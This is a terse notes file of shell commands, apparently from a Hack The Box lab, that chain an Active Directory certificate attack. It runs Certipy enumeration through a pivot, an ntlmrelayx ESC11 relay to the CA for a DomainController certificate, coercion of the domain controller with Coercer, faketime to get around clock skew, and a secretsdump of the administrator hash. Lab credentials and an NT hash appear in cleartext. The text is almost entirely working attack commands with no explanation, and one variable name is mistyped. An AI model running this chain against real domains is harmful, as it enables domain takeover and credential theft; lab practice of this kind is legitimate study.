# with pivot
proxychains4 -q certipy find -u 'nvirelli@ghostlink.htb' -p u47YUclrDiwWxBheaSzI -dc-host dc01.ghostlink.htb -ns 10.129.96.0 -dns-tcp -timeout 10 -vulnerable -stdout

# esc11
proxychains4 -q ./impacket/examples/ntlmrelayx.py  -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController

# ws fuzz 
coercer coerce -l 10.10.17.37 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI --dc-ip dc01.ghostlink.htb --always-continue

# get time offset
OFF=$(( $(date -u -d "$(curl -sSI http://dc01.ghostlink.htb/ | grep -i '^Date:' | sed 's/^[Dd]ate: //' | tr -d '\r')" +%s) - $(date -u +%s) ))
echo $OF 

# fake time auth
FT="$(date -u -d '+8 hours' '+%Y-%m-%d %H:%M:%S')"
faketime "$FT" certipy auth -pfx DC01.pfx -dc-ip dc01.ghostlink.htb -dns-tcp -ns 10.129.96.0  -timeout 10 -domain ghostlink.htb

# last hash and 0x17
secretsdump.py ghostlink.htb/dc01\$@dc01.ghostlink.htb -dc-ip ghostlink.htb -hashes :2f689e5dabd63eceee882856a9353b13 -just-dc-user administrator